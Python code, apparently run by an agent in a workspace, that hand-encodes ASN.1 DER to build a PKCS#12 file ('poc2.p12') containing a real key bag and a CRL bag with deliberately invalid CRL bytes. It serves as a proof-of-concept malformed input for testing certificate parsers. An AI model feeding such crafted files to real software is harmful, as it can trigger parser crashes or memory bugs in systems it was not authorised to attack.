Running Python code interactively: import struct

def encode_length(length):
    if length < 0x80:
        return bytes([length])
    elif length < 0x100:
        return bytes([0x81, length])
    elif length < 0x10000:
        return bytes([0x82, (length >> 8) & 0xff, length & 0xff])
    else:
        return bytes([0x83, (length >> 16) & 0xff, (length >> 8) & 0xff, length & 0xff])

def make_tag(tag_byte, content):
    return bytes([tag_byte]) + encode_length(len(content)) + content

def make_sequence(content):
    return make_tag(0x30, content)

def make_set(content):
    return make_tag(0x31, content)

def make_oid(oid_str):
    parts = [int(x) for x in oid_str.split('.')]
    encoded = bytes([40 * parts[0] + parts[1]])
    for part in parts[2:]:
        if part < 128:
            encoded += bytes([part])
        else:
            # Multi-byte encoding
            octets = []
            octets.append(part & 0x7f)
            part >>= 7
            while part > 0:
                octets.append(0x80 | (part & 0x7f))
                part >>= 7
            encoded += bytes(reversed(octets))
    return make_tag(0x06, encoded)

def make_octet_string(content):
    return make_tag(0x04, content)

def make_explicit(tag_num, content):
    return bytes([0xa0 | tag_num]) + encode_length(len(content)) + content

def make_integer(value):
    return make_tag(0x02, value)

# Read the PKCS#8 key
with open('/workspace/key_pkcs8.der', 'rb') as f:
    pkcs8_key_der = f.read()

print(f"PKCS#8 key size: {len(pkcs8_key_der)} bytes")

# OIDs
OID_DATA = "1.2.840.113549.1.7.1"  # pkcs7-data
OID_KEY_BAG = "1.2.840.113549.1.12.10.1.1"  # keyBag
OID_CRL_BAG = "1.2.840.113549.1.12.10.1.4"  # crlBag
OID_X509_CRL = "1.2.840.113549.1.9.23.1"    # x509Crl

# Build CRL bag with valid CRLBag ASN.1 but invalid CRL content inside
invalid_crl_data = b'\x00\x01\x02\x03'  # Invalid CRL DER

# CRLBag SEQUENCE { OID x509Crl, [0] EXPLICIT OCTET STRING }
crl_bag_value = make_sequence(
    make_oid(OID_X509_CRL) + 
    make_explicit(0, make_octet_string(invalid_crl_data))
)

# SafeBag for CRL: SEQUENCE { OID crlBag, [0] EXPLICIT CRLBag }
crl_safe_bag = make_sequence(
    make_oid(OID_CRL_BAG) + 
    make_explicit(0, crl_bag_value)
)

# SafeContents for CRL bag
crl_safe_contents = make_sequence(crl_safe_bag)

# SafeBag for key: SEQUENCE { OID keyBag, [0] EXPLICIT PKCS8Key }
key_safe_bag = make_sequence(
    make_oid(OID_KEY_BAG) + 
    make_explicit(0, pkcs8_key_der)
)

# SafeContents for key bag
key_safe_contents = make_sequence(key_safe_bag)

# ContentInfo for key: SEQUENCE { OID data, [0] EXPLICIT OCTET STRING(SafeContents) }
key_content_info = make_sequence(
    make_oid(OID_DATA) + 
    make_explicit(0, make_octet_string(key_safe_contents))
)

# ContentInfo for CRL: SEQUENCE { OID data, [0] EXPLICIT OCTET STRING(SafeContents) }
crl_content_info = make_sequence(
    make_oid(OID_DATA) + 
    make_explicit(0, make_octet_string(crl_safe_contents))
)

# AuthenticatedSafe: SEQUENCE OF ContentInfo
auth_safe = make_sequence(key_content_info + crl_content_info)

# PFX (PKCS12): SEQUENCE { version=3, authSafe ContentInfo }
pfx_auth_safe_content_info = make_sequence(
    make_oid(OID_DATA) + 
    make_explicit(0, make_octet_string(auth_safe))
)

pfx = make_sequence(
    make_integer(b'\x03') +  # version 3
    pfx_auth_safe_content_info
)

with open('/workspace/poc2.p12', 'wb') as f:
    f.write(pfx)

print(f"POC size: {len(pfx)} bytes")
print(f"Written to /workspace/poc2.p12")

